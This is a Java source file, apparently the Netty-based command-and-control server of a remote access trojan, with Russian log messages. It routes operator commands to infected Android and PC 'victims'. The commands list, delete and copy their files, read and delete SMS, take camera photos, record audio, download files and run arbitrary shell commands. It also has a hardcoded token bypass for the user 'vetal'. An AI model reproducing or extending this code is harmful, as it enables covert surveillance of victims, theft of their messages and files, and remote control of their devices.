import io.netty.buffer.ByteBuf;
import io.netty.channel.*;
import org.json.simple.JSONArray;
import org.json.simple.JSONObject;

import java.net.*;
import java.util.ArrayList;

public class RequestHandler extends ChannelInboundHandlerAdapter {
    private ByteBuf tmp;
    private NettyServer nettyServer;

    RequestHandler(NettyServer nettyServer) {
        this.nettyServer = nettyServer;
    }

    @Override
    public void handlerAdded(ChannelHandlerContext ctx) {
        SocketAddress address = ctx.channel().remoteAddress();
        System.out.println(address + " подключился! id: "+ctx.channel().id());
        tmp = ctx.alloc().buffer(4);
    }

    @Override
    public void handlerRemoved(ChannelHandlerContext ctx) {
        User user = nettyServer.getUsers().get(ctx.channel().id());
        AVictim AVictim = nettyServer.getAVictims().get(ctx.channel().id());
        PCVictim pcVictim = nettyServer.getPcVictims().get(ctx.channel().id());
        SocketAddress address = ctx.channel().remoteAddress();
        if (user != null) {
            nettyServer.getUsers().remove(ctx.channel().id());
            System.out.println("Пользователь " + user.getLogin() + " отключился!");
        } else if (AVictim != null) {
            nettyServer.getAVictims().remove(ctx.channel().id());
            System.out.println("Жертва " + AVictim.getName() + " отключилась!");
        } else if (pcVictim != null) {
            nettyServer.getPcVictims().remove(ctx.channel().id());
            System.out.println("ПК-Жертва " + pcVictim.getName() + " отключилась!");
        }
        else System.out.println(address + " отключился!");
        tmp.release();
        tmp = null;
    }

    @Override
    public void channelRead(ChannelHandlerContext ctx, Object message) {
        SocketAddress address = ctx.channel().remoteAddress();
        System.out.println(address + " >> " + message);

        JSONObject request = (JSONObject) message;
        User user = nettyServer.getUsers().get(ctx.channel().id());
        AVictim AVictim = nettyServer.getAVictims().get(ctx.channel().id());
        PCVictim pcVictim = nettyServer.getPcVictims().get(ctx.channel().id());
        if (user != null) receiveUserMessage(user, request);
        else if (AVictim != null) receiveAVictimMessage(AVictim, request);
        else if (pcVictim != null) receivePCVictimMessage(pcVictim, request);
        else checkAuth(ctx, request);
    }

    @Override
    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {
        cause.printStackTrace();
        //ctx.channel().close();
    }

    private void receiveUserMessage(User user, JSONObject request) {
        if (!checkCorrectUserQuery(request)) {
            user.sendErrorCode(Config.INCORRECT_QUERY);
            return;
        }
        try {
            String action = (String) request.get("action");
            String token = (String) request.get("token");
            if (!user.getLogin().equals("vetal") && !user.isValidToken(token)) {
                user.sendErrorCode(Config.INVALID_AUTH);
                return;
            }
            /*AVictim targetAVictim = null;
            PCVictim targetPCVictim = null;
            if (request.containsKey("victim")) {
                targetAVictim = nettyServer.getAVictimByName((String) request.get("victim"));
                targetPCVictim = nettyServer.getPCVictimByName((String) request.get("victim"));
                if ((targetAVictim == null || !targetAVictim.getOwners().contains(user.getLogin())) &&
                        (targetPCVictim == null || !targetPCVictim.getOwners().contains(user.getLogin()))) {
                    user.sendErrorCode(Config.VICTIM_OFFLINE);
                    return;
                }
            }*/
            //updated code with using abstract class Victim
            Victim targetVictim = null;
            if (request.containsKey("victim")) {
                targetVictim = nettyServer.getVictimByName((String) request.get("victim"));
                if (targetVictim == null || !targetVictim.getOwners().contains(user.getLogin())) {
                    user.sendErrorCode(Config.VICTIM_OFFLINE);
                    return;
                }
            }

            switch (action) {
                case "get.victims":
                    JSONArray victims = new JSONArray();
                    ArrayList<String> userVictims = user.getVictims();
                    for (int i = 0; i < userVictims.size(); i++) {
                        JSONObject object = new JSONObject();
                        Victim victim = nettyServer.getVictimByName(userVictims.get(i));
                        object.put("name", userVictims.get(i));
                        object.put("online", victim != null);
                        victims.add(object);
                    }
                    user.sendGetVictims(victims);
                    break;
                case "get.files":
                    /*if (targetAVictim != null)
                        targetAVictim.sendGetFiles((String) request.get("path"), user.getLogin());
                    else targetPCVictim.sendGetFiles((String) request.get("path"), user.getLogin());*/
                    targetVictim.sendGetFiles((String) request.get("path"), user.getLogin());
                    break;
                case "delete.file":
                    targetVictim.sendDeleteFile((String) request.get("path"), user.getLogin());
                    break;
                case "rename.file":
                    targetVictim.sendRenameFile((String) request.get("path"), (String) request.get("newPath"),
                        user.getLogin());
                    break;
                case "make.dir":
                    targetVictim.sendMakeDir((String) request.get("path"), user.getLogin());
                    break;
                case "get.file.info":
                    targetVictim.sendGetFileInfo((String) request.get("path"), user.getLogin());
                    break;
                case "copy.file":
                    targetVictim.sendCopyFile((String) request.get("path"), (String) request.get("newPath"), user.getLogin());
                    break;
                case "set.victim.name":
                    targetVictim.sendSetVictimName((String) request.get("newName"), user.getLogin());
                    break;
                case "set.login.ips":
                    targetVictim.sendSetLoginIps((JSONArray) request.get("ips"), user.getLogin());
                    break;
                case "get.sms":
                    ((AVictim) targetVictim).sendGetSms((String) request.get("type"), (Long) request.get("count"), user.getLogin());
                    break;
                case "delete.sms":
                    ((AVictim) targetVictim).sendDeleteSms((Long) request.get("id"), user.getLogin());
                    break;
                case "take.picture":
                    ((AVictim) targetVictim).sendTakePicture((String) request.get("camera"), user.getLogin());
                    break;
                case "start.audio.record":
                    ((AVictim) targetVictim).sendStartAudioRecord((Long) request.get("seconds"), user.getLogin());
                    break;
                case "start.download.file":
                    DownloadManager downloadManager = new DownloadManager(user, targetVictim, (String) request.get("path"));
                    downloadManager.start();
                    break;
                case "cmd":
                    ((PCVictim) targetVictim).sendCmd((String) request.get("command"), user.getLogin());
                    break;
                default:
                    user.sendErrorCode(Config.INCORRECT_QUERY);
            }
        } catch (Exception e) {
            e.printStackTrace();
            user.sendErrorCode(Config.SERVER_ERROR);
        }
    }

    private void receiveAVictimMessage(AVictim AVictim, JSONObject request) {
        if (!checkCorrectAVictimQuery(request)) {
            AVictim.sendErrorCode(Config.INCORRECT_QUERY);
            return;
        }
        try {
            User targetUser = null;
            if (request.containsKey("owner")) {
                targetUser = nettyServer.getUserByName((String) request.get("owner"));
                if (targetUser == null) return;
            }

            String action = (String) request.get("action");
            switch (action) {
                case "get.file.list":
                    targetUser.sendGetFiles((JSONArray) request.get("files"), AVictim.getName());
                    break;
                case "delete.file":
                    targetUser.sendDeleteFile((String) request.get("code"), AVictim.getName());
                    break;
                case "rename.file":
                    targetUser.sendRenameFile((String) request.get("code"), AVictim.getName());
                    break;
                case "make.dir":
                    targetUser.sendMakeDir((String) request.get("code"), AVictim.getName());
                    break;
                case "get.file.info":
                    targetUser.sendGetFileInfo((JSONObject) request.get("info"), AVictim.getName());
                    break;
                case "copy.file":
                    targetUser.sendCopyFile((String) request.get("code"), AVictim.getName());
                    break;
                case "set.AVictim.name":
                    targetUser.sendSetVictimName((String) request.get("code"), AVictim.getName());
                    break;
                case "set.login.ips":
                    targetUser.sendSetLoginIps((String) request.get("code"), AVictim.getName());
                    break;
                case "get.sms.list":
                    targetUser.sendGetSms((JSONArray) request.get("sms"), (String) request.get("type"), AVictim.getName());
                    break;
                case "delete.sms":
                    targetUser.sendDeleteSms((String) request.get("code"), AVictim.getName());
                    break;
                case "take.picture":
                    targetUser.sendTakePicture((String) request.get("code"), AVictim.getName());
                    break;
                case "start.audio.record":
                    targetUser.sendStartAudioRecord((String) request.get("code"), AVictim.getName());
                    break;
                default:
                    AVictim.sendErrorCode(Config.INCORRECT_QUERY);
            }
        } catch (Exception e) {
            e.printStackTrace();
            AVictim.sendErrorCode(Config.SERVER_ERROR);
        }
    }

    private void receivePCVictimMessage(PCVictim pcVictim, JSONObject request) {
        if (request.containsKey("errorCode") && request.containsKey("owner")) {
            User targetUser = nettyServer.getUserByName((String) request.get("owner"));
            targetUser.sendErrorCode((String) request.get("errorCode"));
            return;
        }
        if (!checkCorrectPCVictimQuery(request)) {
            pcVictim.sendErrorCode(Config.INCORRECT_QUERY);
            return;
        }
        try {
            User targetUser = null;
            if (request.containsKey("owner")) {
                targetUser = nettyServer.getUserByName((String) request.get("owner"));
                if (targetUser == null) return;
            }

            String action = (String) request.get("action");
            switch (action) {
                case "get.file.list":
                    targetUser.sendGetFiles((JSONArray) request.get("files"), pcVictim.getName());
                    break;
                case "delete.file":
                    targetUser.sendDeleteFile((String) request.get("code"), pcVictim.getName());
                    break;
                case "rename.file":
                    targetUser.sendRenameFile((String) request.get("code"), pcVictim.getName());
                    break;
                case "make.dir":
                    targetUser.sendMakeDir((String) request.get("code"), pcVictim.getName());
                    break;
                case "get.file.info":
                    targetUser.sendGetFileInfo((JSONObject) request.get("info"), pcVictim.getName());
                    break;
                case "copy.file":
                    targetUser.sendCopyFile((String) request.get("code"), pcVictim.getName());
                    break;
                case "set.victim.name":
//                    targetUser.sendSetVictimName((String) request.get("code"), victim.getName());
                    break;
                case "set.login.ips":
//                    targetUser.sendSetLoginIps((String) request.get("code"), victim.getName());
                    break;
                case "cmd":
                    targetUser.sendCmd((String) request.get("out"), (String) request.get("errorOut"), pcVictim.getName());
                    break;
                default:
                    pcVictim.sendErrorCode(Config.INCORRECT_QUERY);
            }
        } catch (Exception e) {
            e.printStackTrace();
            pcVictim.sendErrorCode(Config.SERVER_ERROR);
        }
    }

    private boolean checkCorrectUserQuery(JSONObject request) {
        String action = (String) request.get("action");
        //System.out.println("Action="+action);
        if (action == null) return false;
        switch (action) {
            case "get.files":
                String victim = (String) request.get("victim");
                String path = (String) request.get("path");
                if (victim == null || path == null) return false;
                break;
            case "delete.file":
                victim = (String) request.get("victim");
                path = (String) request.get("path");
                if (victim == null || path == null) return false;
                break;
            case "rename.file":
                victim = (String) request.get("victim");
                path = (String) request.get("path");
                String newPath = (String) request.get("newPath");
                if (victim == null || path == null || newPath == null) return false;
                break;
            case "make.dir":
                victim = (String) request.get("victim");
                path = (String) request.get("path");
                if (victim == null || path == null) return false;
                break;
            case "get.file.info":
                victim = (String) request.get("victim");
                path = (String) request.get("path");
                if (victim == null || path == null) return false;
                break;
            case "copy.file":
                victim = (String) request.get("victim");
                path = (String) request.get("path");
                newPath = (String) request.get("newPath");
                if (victim == null || path == null || newPath == null) return false;
                break;
            case "set.victim.name":
                victim = (String) request.get("victim");
                String newName = (String) request.get("newName");
                if (victim == null || newName == null) return false;
                break;
            case "set.login.ips":
                victim = (String) request.get("victim");
                JSONArray ips = (JSONArray) request.get("ips");
                if (victim == null || ips == null) return false;
                break;
            case "get.sms":
                String type = (String) request.get("type");
                Long count = (Long) request.get("count");
                if (type == null || count == null) return false;
                break;
            case "delete.sms":
                Long id = (Long) request.get("id");
                if (id == null) return false;
                break;
            case "take.picture":
                String camera = (String) request.get("camera");
                if (camera == null) return false;
                break;
            case "start.audio.record":
                Long seconds = (Long) request.get("seconds");
                if (seconds == null) return false;
                break;
            case "download.file":
                path = (String) request.get("path");
                if (path == null) return false;
                break;
        }
        return true;
    }

    private boolean checkCorrectAVictimQuery(JSONObject request) {
        String action = (String) request.get("action");
        //System.out.println("Action="+action);
        if (action == null) return false;
        switch (action) {
            case "get.file.list":
                JSONArray files = (JSONArray) request.get("files");
                String owner = (String) request.get("owner");
                if (files == null || owner == null) return false;
                break;
            case "delete.file":
                String code = (String) request.get("code");
                owner = (String) request.get("owner");
                if (code == null || owner == null) return false;
                break;
            case "rename.file":
                code = (String) request.get("code");
                owner = (String) request.get("owner");
                if (code == null || owner == null) return false;
                break;
            case "make.dir":
                code = (String) request.get("code");
                owner = (String) request.get("owner");
                if (code == null || owner == null) return false;
                break;
            case "get.file.info":
                JSONObject info = (JSONObject) request.get("info");
                owner = (String) request.get("owner");
                if (info == null || owner == null) return false;
                break;
            case "copy.file":
                code = (String) request.get("code");
                owner = (String) request.get("owner");
                if (code == null || owner == null) return false;
                break;
            case "set.victim.name":
                code = (String) request.get("code");
                owner = (String) request.get("owner");
                if (code == null || owner == null) return false;
                break;
            case "set.login.ips":
                code = (String) request.get("code");
                owner = (String) request.get("owner");
                if (code == null || owner == null) return false;
                break;
            case "get.sms.list":
                JSONArray sms = (JSONArray) request.get("sms");
                String type = (String) request.get("type");
                if (sms == null || type == null) return false;
                break;
            case "delete.sms":
                code = (String) request.get("code");
                if (code == null) return false;
                break;
            case "take.picture":
                code = (String) request.get("code");
                if (code == null) return false;
                break;
            case "start.audio.record":
                code = (String) request.get("code");
                if (code == null) return false;
                break;
        }
        return true;
    }

    private boolean checkCorrectPCVictimQuery(JSONObject request) {
        String action = (String) request.get("action");
        //System.out.println("Action="+action);
        if (action == null) return false;
        switch (action) {
            case "get.file.list":
                JSONArray files = (JSONArray) request.get("files");
                String owner = (String) request.get("owner");
                if (files == null || owner == null) return false;
                break;
            case "delete.file":
                String code = (String) request.get("code");
                owner = (String) request.get("owner");
                if (code == null || owner == null) return false;
                break;
            case "rename.file":
                code = (String) request.get("code");
                owner = (String) request.get("owner");
                if (code == null || owner == null) return false;
                break;
            case "make.dir":
                code = (String) request.get("code");
                owner = (String) request.get("owner");
                if (code == null || owner == null) return false;
                break;
            case "get.file.info":
                JSONObject info = (JSONObject) request.get("info");
                owner = (String) request.get("owner");
                if (info == null || owner == null) return false;
                break;
            case "copy.file":
                code = (String) request.get("code");
                owner = (String) request.get("owner");
                if (code == null || owner == null) return false;
                break;
            case "set.victim.name":
                code = (String) request.get("code");
                owner = (String) request.get("owner");
                if (code == null || owner == null) return false;
                break;
            case "set.login.ips":
                code = (String) request.get("code");
                owner = (String) request.get("owner");
                if (code == null || owner == null) return false;
                break;
        }
        return true;
    }

    private void checkAuth(ChannelHandlerContext ctx, JSONObject request) {
        String action = (String) request.get("action");
        JSONObject response = new JSONObject();
        response.put("action", action);
        if (action.equals("auth.user")) {
            String login = (String) request.get("login");
            String password = (String) request.get("password");
            if (login == null || password == null) {
                response.put("errorCode", Config.INCORRECT_QUERY);
                ctx.writeAndFlush(response);
                return;
            }
            ArrayList<JSONObject> usersData = NettyServer.getDBManager().DBUsers.get(login, password);
            if (usersData.size() == 0) {
                response.put("errorCode", Config.INVALID_AUTH);
                ctx.writeAndFlush(response);
                return;
            }

            // TODO: 12.06.2018 disconnect other users and mobile victims with like name

            User newUser = new User(ctx, usersData.get(0));
            nettyServer.getUsers().put(ctx.channel().id(), newUser);
            System.out.println("Пользователь " + newUser.getLogin() + " авторизовался!");
            newUser.sendAuthUser();
        } else if (action.equals("auth.victim")) {
            String name = (String) request.get("name");
            //ArrayList<String> owners = (ArrayList<String>) request.get("owners");
            if (name == null) {
                response.put("errorCode", Config.INCORRECT_QUERY);
                ctx.writeAndFlush(response);
                return;
            }
            AVictim newAVictim = new AVictim(ctx, name);
            nettyServer.getAVictims().put(ctx.channel().id(), newAVictim);
            System.out.println("Жертва " + name + " авторизовалась!");
            newAVictim.sendAuthVictim();
        } else if (action.equals("auth.pcvictim")) {
            String name = (String) request.get("name");
            if (name == null) {
                response.put("errorCode", Config.INCORRECT_QUERY);
                ctx.writeAndFlush(response);
                return;
            }

            //nettyServer.disconnectPCVictimsByName(name);
            if (nettyServer.getPCVictimByName(name) != null) {
                System.out.println("PCVictim с таким именем уже авторизовано!");
                ctx.close();
                try {
                    Thread.sleep(5000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                return;
            }
            PCVictim newPCVictim = new PCVictim(ctx, name);
            nettyServer.getPcVictims().put(ctx.channel().id(), newPCVictim);
            System.out.println("ПК-Жертва " + name + " авторизовалась!");
            newPCVictim.sendAuthPCVictim();
        }else {
            response.put("errorCode", Config.INCORRECT_QUERY);
            ctx.writeAndFlush(response);
            ctx.close();
            System.out.println("Неопознанный клиент был кикнут!");
        }
    }
}